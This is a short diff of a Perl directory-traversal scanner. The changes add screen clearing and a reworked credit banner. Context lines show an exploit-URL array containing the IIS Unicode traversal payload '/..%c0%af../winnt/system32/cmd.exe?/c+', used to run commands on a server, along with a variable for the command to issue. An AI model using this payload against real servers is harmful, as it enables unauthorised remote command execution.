@@ -25,7 +25,7 @@
 use strict;
 use IO::Socket;
 
-# Globals Go Here.
+# Globals
 my $host;		# Host being probed.
 my $port;		# Webserver port.
 my $command;		# Command to issue.
@@ -33,6 +33,13 @@ my $url;		# URL being used.
 my @results;		# Results from server.
 my $probe;		# Whether to display output.
 my @U;			# Unicode URLS. 
+
+# Flush buffer
+$| = 1;
+
+# Clear the screen and jump to 0,0
+print "\033[2J";    
+print "\033[0;0H";
 
 # Bugs
 $U[1] = "/..%c0%af../winnt/system32/cmd.exe?/c+";
@@ -1190,6 +1197,6 @@ exit;
 
 # Help subroutine.
 sub help {
-print "\n\n#################################\n[Directory Traversal Bug Scanner] \n[ Coded By Haroon Awan 		]\n[ Mail\: mrharoonawan\@gmail.com 	]\n#################################\n\n";
+print "\n\n					#################################\n					[Directory Traversal Bug Scanner] \n					[ Coded By Haroon Awan 		]\n					[ Mail\: mrharoonawan\@gmail.com 	]\n					[Official Web\:fb.com\/mubassir.py]\n					#################################\n\n";
 }; #
 
